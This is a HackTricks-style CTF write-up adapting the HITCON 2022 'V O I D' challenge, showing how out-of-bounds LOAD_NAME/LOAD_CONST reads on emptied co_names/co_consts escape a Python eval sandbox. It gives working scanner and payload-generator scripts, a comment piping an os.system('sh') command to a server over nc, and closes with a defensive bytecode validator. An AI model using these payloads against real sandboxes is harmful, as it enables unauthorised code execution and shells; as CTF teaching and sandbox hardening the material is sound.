# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

This page adapts Splitline's original HITCON CTF 2022 "V O I D" writeup and exploit chain.<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

A `LOAD_NAME` or `LOAD_CONST` operand can read outside a deliberately shortened `co_names` or `co_consts` tuple. In this challenge, unreachable dummy names are used until a nearby entry contains a useful attribute such as `__getattribute__`.<sup>[[1]](#references)</sup>

The remaining payload reuses that recovered name to build a sandbox escape.<sup>[[1]](#references)</sup>

### Overview <a href="#overview-1" id="overview-1"></a>

The challenge wrapper is short and compiles one expression before evaluating it:<sup>[[1]](#references)</sup>

```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```

The input is compiled to a Python code object, then the wrapper replaces its `co_consts` and `co_names` with empty tuples before calling `eval`.<sup>[[1]](#references)[[5]](#references)</sup>

Any generated instruction that still indexes one of those tables can crash the interpreter or expose an adjacent object pointer, depending on the build.<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

How does the segfault happen?

For a list expression such as `[a, b, c]`, the compiler emits `LOAD_NAME` instructions with consecutive operands:<sup>[[1]](#references)[[2]](#references)</sup>

```
  1           0 LOAD_NAME                0 (a)
              2 LOAD_NAME                1 (b)
              4 LOAD_NAME                2 (c)
              6 BUILD_LIST               3
              8 RETURN_VALUE
```

If `co_names` is replaced with `()`, the bytecode still carries `LOAD_NAME 2`; an unchecked tuple access can therefore fetch a pointer outside the tuple instead of raising `IndexError`.<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME` and `LOAD_CONST` are the core primitives here: their integer operands select entries in `co_names` and `co_consts`, respectively.<sup>[[1]](#references)[[2]](#references)</sup>

In CPython's dispatch, `LOAD_CONST` retrieves the selected tuple entry and pushes it; release builds use an unchecked tuple accessor:<sup>[[3]](#references)</sup>

```c
case TARGET(LOAD_CONST): {
    PREDICTED(LOAD_CONST);
    PyObject *value = GETITEM(consts, oparg);
    Py_INCREF(value);
    PUSH(value);
    FAST_DISPATCH();
}
```

Probe increasing `LOAD_NAME` operands on the target interpreter to map useful entries. Splitline observed useful offsets above 700 in the challenge environment, but the layout is build-specific; a debugger can help inspect the surrounding memory.<sup>[[1]](#references)</sup>

### Generating the Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Once an offset yields a useful name, place the out-of-range lookup in an unreachable expression and reference the same `co_names` slot from a reachable attribute access.<sup>[[1]](#references)</sup>

For example, if offset 5 yields `__getattribute__`, keep that name at slot 5 while the false branch performs the useful lookup:<sup>[[1]](#references)</sup>

```python
[a,b,c,d,e,__getattribute__] if [] else [
    [].__getattribute__
    # you can get the __getattribute__ method of list object now!
]
```

> The recovered text need not be `__getattribute__`; any identifier that serves the payload can occupy the slot.<sup>[[1]](#references)</sup>

The compiler reuses a `co_names` slot for repeated occurrences of one name, as the disassembly illustrates:<sup>[[1]](#references)[[2]](#references)</sup>

```python
              0 BUILD_LIST               0
              2 POP_JUMP_IF_FALSE       20
        >>    4 LOAD_NAME                0 (a)
        >>    6 LOAD_NAME                1 (b)
        >>    8 LOAD_NAME                2 (c)
        >>   10 LOAD_NAME                3 (d)
        >>   12 LOAD_NAME                4 (e)
        >>   14 LOAD_NAME                5 (__getattribute__)
             16 BUILD_LIST               6
             18 RETURN_VALUE
             20 BUILD_LIST               0
        >>   22 LOAD_ATTR                5 (__getattribute__)
             24 BUILD_LIST               1
             26 RETURN_VALUE
```

Because `LOAD_ATTR` also resolves its name through `co_names`, the reachable branch can reuse that slot; packed operands on newer CPython versions are described in the version notes below.<sup>[[1]](#references)[[2]](#references)</sup>

Small non-negative integers can be synthesized from boolean expressions without constants:<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

The original exploit used names rather than constants to stay within the challenge's length limit.<sup>[[1]](#references)</sup>

This helper scans candidate name offsets by constructing a code object with an empty `co_names` tuple.<sup>[[1]](#references)</sup>

```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
    def __getitem__(self, k):
        if type(k) == str:
            return k


if __name__ == '__main__':
    n = int(argv[1])

    code = [
        *([opmap['EXTENDED_ARG'], n // 256]
          if n // 256 != 0 else []),
        opmap['LOAD_NAME'], n % 256,
        opmap['RETURN_VALUE'], 0
    ]

    c = CodeType(
        0, 0, 0, 0, 0, 0,
        bytes(code),
        (), (), (), '<sandbox>', '<eval>', 0, b'', ()
    )

    ret = eval(c, {'__builtins__': MockBuiltins()})
    if ret:
        print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```

The generator below maps the recovered offsets to names and emits the source-level payload.<sup>[[1]](#references)</sup>

```python
import sys
import unicodedata


class Generator:
    # get numner
    def __call__(self, num):
        if num == 0:
            return '(not[[]])'
        return '(' + ('(not[])+' * num)[:-1] + ')'

    # get string
    def __getattribute__(self, name):
        try:
            offset = None.__dir__().index(name)
            return f'keys[{self(offset)}]'
        except ValueError:
            offset = None.__class__.__dir__(None.__class__).index(name)
            return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
    while True:
        chr_code += 1
        char = unicodedata.normalize('NFKC', chr(chr_code))
        if char.isidentifier() and char not in names:
            names.append(char)
            break

offsets = {
    "__delitem__": 2800,
    "__getattribute__": 2850,
    '__dir__': 4693,
    '__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
             'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
    names[offset] = name

for i, var in enumerate(variables):
    assert var not in offsets
    names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
    get(get([],{_.__class__}),{_.__base__}),
    {_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
    builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```

At a high level, the generated payload obtains a function's globals, recovers `builtins`, and calls `eval(input())`.<sup>[[1]](#references)</sup>

```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
  getattr(
    getattr(
      [].__getattribute__('__class__'),
    '__base__'),
  '__subclasses__'
  )()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```

---

### Version notes and affected opcodes (Python 3.11–3.13)

- On CPython 3.11–3.13, instructions still use integer operands to index the code object's constant and name tables. If either tuple is shorter than a referenced index, an unchecked access can read an adjacent object pointer and crash or operate on it; exact behavior depends on the interpreter build.<sup>[[2]](#references)[[3]](#references)</sup>
  - `LOAD_CONST consti` and (3.12+) `RETURN_CONST consti` read `co_consts[consti]`.<sup>[[2]](#references)</sup>
  - Direct name-table users include `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR`, and (3.12+) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
  - `LOAD_GLOBAL namei` and `LOAD_ATTR namei` use `co_names[namei >> 1]`; the low bit controls the documented NULL/method behavior. (3.12+) `LOAD_SUPER_ATTR namei` uses `co_names[namei >> 2]` and packs two flags into its low bits.<sup>[[2]](#references)</sup>
- Python 3.11+ introduced adaptive/inline caches that add hidden `CACHE` entries between instructions. Handcrafted bytecode must account for those entries when building `co_code`.<sup>[[2]](#references)</sup>

Practical implication: bytecode layout and recovered offsets are release- and build-specific. Test the technique and any generated payload against the target CPython version before relying on it.<sup>[[2]](#references)</sup>

### Quick scanner for useful OOB indexes (3.11+/3.12+ compatible)

If you prefer to probe for interesting objects directly from bytecode rather than from high-level source, you can generate minimal code objects and brute-force indices. The helper below inserts inline caches according to the target interpreter's `dis` metadata.<sup>[[2]](#references)</sup>

```python
import dis, types

def assemble(ops):
    # ops: list of (opname, arg) pairs
    cache = bytes([dis.opmap.get("CACHE", 0), 0])
    out = bytearray()
    for op, arg in ops:
        opc = dis.opmap[op]
        out += bytes([opc, arg])
        # Python >=3.11 inserts per-opcode inline cache entries
        ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
        out += cache * ncache
    return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
    code = assemble([
        ("RESUME", 0),          # 3.11+
        ("LOAD_CONST", i),
        ("RETURN_VALUE", 0),
    ])
    c = base.replace(co_code=code, co_consts=(), co_names=())
    try:
        return eval(c)
    except Exception:
        return None

for idx in range(0, 300):
    obj = probe_const(idx)
    if obj is not None:
        print(idx, type(obj), repr(obj)[:80])
```

Notes
- To probe names instead, swap `LOAD_CONST` for `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` and adjust the stack usage and packed operand for the target opcode.<sup>[[2]](#references)</sup>
- Use `EXTENDED_ARG` or multiple bytes of `arg` to reach indexes >255 if needed. This helper emits only the low operand byte, so larger indexes require raw byte construction or multiple loads.<sup>[[2]](#references)</sup>

### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)

Once you identify a `co_consts` index that resolves to the builtins module, you can reconstruct `eval(input())` without `co_names` by manipulating the stack. The official B01lers CTF 2024 `awpcode` material documents this same OOB-read pattern.<sup>[[4]](#references)</sup>

```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```

This stack-only approach is useful when a challenge gives you direct control over `co_code` while forcing `co_consts=()` and `co_names=()`; it avoids source-level tricks and can keep payloads small by using bytecode stack operations and tuple builders.<sup>[[4]](#references)</sup>

### Defensive checks and mitigations for sandboxes

If you are writing a Python sandbox that compiles or evaluates untrusted code, do not rely on CPython to bounds-check tuple indexes used by bytecode. Validate code objects before executing them.<sup>[[2]](#references)[[3]](#references)</sup>

Practical validator (rejects OOB access to co_consts/co_names).<sup>[[2]](#references)</sup>

```python
import dis

def max_name_index(code):
    max_idx = -1
    direct_name_ops = {
        "LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
        "IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
        "LOAD_FROM_DICT_OR_GLOBALS",
    }
    for ins in dis.get_instructions(code):
        if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
            namei = ins.arg or 0
            # 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
            if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
                namei >>= 1
            elif ins.opname == "LOAD_SUPER_ATTR":
                namei >>= 2
            max_idx = max(max_idx, namei)
    return max_idx

def max_const_index(code):
    return max([ins.arg for ins in dis.get_instructions(code)
                if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
    if max_const_index(code) >= len(code.co_consts):
        raise ValueError("Bytecode refers to const index beyond co_consts length")
    if max_name_index(code) >= len(code.co_names):
        raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```

Additional mitigation ideas
- Don’t allow arbitrary `CodeType.replace(...)` on untrusted input, or add strict structural checks on the resulting code object.
- Consider running untrusted code in a separate process with OS-level sandboxing (seccomp, job objects, containers) instead of relying on CPython semantics.

## References

- [1] [Splitline's HITCON CTF 2022 writeup "V O I D" (origin of this technique and high-level exploit chain)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Python 3.13 `dis` documentation (bytecode indices, packed name operands, and inline caches)](https://docs.python.org/3.13/library/dis.html)
- [3] [CPython 3.13.5 tuple-access macros (`GETITEM`)](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [B01lers CTF 2024 `awpcode` challenge writeup (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python C API: Code Objects](https://docs.python.org/3/c-api/code.html)

{{#include ../../../banners/hacktricks-training.md}}
